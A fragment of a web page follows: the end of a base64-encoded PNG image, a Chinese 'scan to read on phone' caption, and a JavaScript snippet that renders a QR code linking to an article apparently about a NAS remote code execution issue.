dLeceFQdRY589QnMQHkD0S1H1MJcbAffPoeLsF7aBZOPOrzuBPZDrzr7c+eWB6FopIK4gUDY2Ka8CuF9ZwNIDAnddXgc8crnAnsxB+KGjdegcPObulRG6xz0qhPBlDYKDju4Nncs1zl8eiAs3/pkTWP4ua7WlJy60D2L64hwQnD1Ca8od5iD8gKX7zYG+bsItAZruHjf68MOejNB7VIUQeq6xL3Njbk/G0aN11vcNyacx5e8n2u+yIN4CeB392Jq2wuuM4h1wvMdRjWqzBtFDvCPrY37Gk2vszwixJ5Ct9xxoN/VODH9A6AM9LfcNmY7kWmIP5Nrzn3ZvA8lX80w+dboRENcSOt7o+wfMXN7nbrr9UXE3evqwbxJuhLWMN/r+AfNz3IXFHxA1C0v5m4iVP2sQ/YGvNpCv/c9HnMA0EOjTgjlfPbXfyJVHmn3Q+4sfA7oOPMhA+0sUIn8wnFjAXAfBQcdVK+g+eMxXdVnzeQingWTjzt9/Ansg7z/z5Y5vG4iuo8NP5LXQHPRrb076UdiTEeYeEFzVJ9daz5xza8KKE6+oNHMQzwE1vm0gfqCNX1+rM/jjA9Ebo8gPAfPbYV1ehzk49tsjhPApPxNw7PczCKte4hUQPaCj/TBzqnHY57Xwjw/Em248dwJ7IOfO6W2uaSC6Nqv4iSc72/+ML3v8bCvOnoyVP+urPNeOeVUH/cuY/dC5aSBVk8297wTaQKBPCZ7nq0f05IX2wdzT2jOEqK18EBr0/zQUOgeP+bMe1qHX6fNQWMsI3QePefatcvV2tIGsCrb2vhPYA3nfWZ/a6X8AAAD//12WWOEAAAAGSURBVAMAR7kSp0poiO0AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-internal\_backup-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 